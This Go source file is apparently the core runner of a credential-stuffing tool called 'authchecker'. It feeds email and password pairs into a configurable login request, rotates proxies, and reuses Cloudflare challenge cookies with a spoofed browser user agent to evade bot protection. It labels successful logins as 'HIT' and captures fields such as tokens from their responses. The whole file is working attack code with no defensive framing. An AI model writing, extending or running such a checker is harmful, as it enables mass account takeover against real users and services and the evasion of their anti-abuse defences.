package runner

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"authchecker/internal/cf"
	"authchecker/internal/config"
)

type CheckInput struct {
	Email    string
	Password string
	ProxyURL string
	LineNum  int
}

type CheckResult struct {
	Email    string            `json:"email"`
	Password string            `json:"password"`
	Status   string            `json:"status"`
	Capture  map[string]string `json:"capture,omitempty"`
	Detail   string            `json:"detail,omitempty"`
	LineNum  int               `json:"line_num"`
}

type Bot struct {
	cfg       *config.Config
	cfManager *cf.Manager
	client    *http.Client
}

func NewBot(cfg *config.Config, cfManager *cf.Manager) *Bot {
	return &Bot{
		cfg:       cfg,
		cfManager: cfManager,
		client: &http.Client{
			Timeout: time.Duration(cfg.Timeout) * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

func (b *Bot) Check(ctx context.Context, input CheckInput) CheckResult {
	result := CheckResult{
		Email:    input.Email,
		Password: input.Password,
		Status:   "ERROR",
		LineNum:  input.LineNum,
	}

	body := b.cfg.Request.Body
	body = strings.ReplaceAll(body, "{{email}}", input.Email)
	body = strings.ReplaceAll(body, "{{password}}", input.Password)
	body = strings.ReplaceAll(body, "{{username}}", input.Email)
	body = strings.ReplaceAll(body, "{{user}}", input.Email)
	body = strings.ReplaceAll(body, "{{pass}}", input.Password)

	req, err := http.NewRequestWithContext(ctx, b.cfg.Request.Method, b.cfg.Request.URL, bytes.NewReader([]byte(body)))
	if err != nil {
		result.Detail = err.Error()
		return result
	}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

	if b.cfg.Cloudflare.Enabled && b.cfManager != nil {
		cfURL := extractBaseURL(b.cfg.Request.URL)
		sess, err := b.cfManager.GetSession(ctx, cfURL, input.ProxyURL)
		if err != nil {
			result.Status = "RETRY"
			result.Detail = "cf solve failed: " + err.Error()
			return result
		}
		if sess.UserAgent != "" {
			userAgent = sess.UserAgent
		}
		for name, value := range sess.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
	}

	for k, v := range b.cfg.Request.Headers {
		val := v
		val = strings.ReplaceAll(val, "{{cf_user_agent}}", userAgent)
		req.Header.Set(k, val)
	}
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", userAgent)
	}
	if req.Header.Get("Content-Type") == "" && body != "" {
		req.Header.Set("Content-Type", "application/json")
	}

	if input.ProxyURL != "" {
		proxyURL, err := url.Parse(input.ProxyURL)
		if err == nil {
			transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
			b.client.Transport = transport
		}
	} else {
		b.client.Transport = nil
	}

	resp, err := b.client.Do(req)
	if err != nil {
		result.Status = "RETRY"
		result.Detail = err.Error()
		return result
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	source := string(respBody)

	if resp.StatusCode == 403 && b.cfg.Cloudflare.Enabled {
		if b.cfManager != nil {
			b.cfManager.Invalidate(extractBaseURL(b.cfg.Request.URL), input.ProxyURL)
		}
		result.Status = "RETRY"
		result.Detail = "403 - cf cookie expired"
		return result
	}

	status := evaluateRules(b.cfg.Success, source, resp.StatusCode, true)
	if status != "" {
		result.Status = status
		result.Capture = extractCaptures(b.cfg.Capture, source)
		return result
	}

	failStatus := evaluateRules(b.cfg.Fail, source, resp.StatusCode, false)
	if failStatus != "" {
		result.Status = "FAIL"
		return result
	}

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		result.Status = "NONE"
	} else {
		result.Status = "ERROR"
		result.Detail = fmt.Sprintf("status %d", resp.StatusCode)
	}
	return result
}

func extractBaseURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	return fmt.Sprintf("%s://%s", u.Scheme, u.Host)
}

func evaluateRules(rules []config.Rule, source string, statusCode int, isSuccess bool) string {
	for _, rule := range rules {
		matched := false
		switch rule.Type {
		case "status_code":
			matched = fmt.Sprintf("%d", statusCode) == rule.Value
		case "body_contains":
			matched = strings.Contains(source, rule.Value)
		case "json_path":
			matched = jsonPathExists(source, rule.Path)
		case "body_not_contains":
			matched = !strings.Contains(source, rule.Value)
		}
		if matched {
			if isSuccess {
				return "HIT"
			}
			return "FAIL"
		}
	}
	return ""
}

func jsonPathExists(source, path string) bool {
	if path == "" {
		return false
	}
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(source), &data); err != nil {
		return strings.Contains(source, path)
	}
	parts := strings.Split(path, ".")
	var current interface{} = data
	for _, p := range parts {
		m, ok := current.(map[string]interface{})
		if !ok {
			return false
		}
		current, ok = m[p]
		if !ok {
			return false
		}
	}
	return current != nil
}

func extractCaptures(rules []config.CaptureRule, source string) map[string]string {
	out := make(map[string]string)
	for _, rule := range rules {
		if rule.Type == "json_path" && rule.Path != "" {
			var data map[string]interface{}
			if json.Unmarshal([]byte(source), &data) == nil {
				parts := strings.Split(rule.Path, ".")
				var current interface{} = data
				for _, p := range parts {
					m, ok := current.(map[string]interface{})
					if !ok {
						break
					}
					current, ok = m[p]
					if !ok {
						break
					}
				}
				if s, ok := current.(string); ok {
					key := rule.SaveAs
					if key == "" {
						key = rule.Path
					}
					out[key] = s
				}
			}
		}
	}
	return out
}
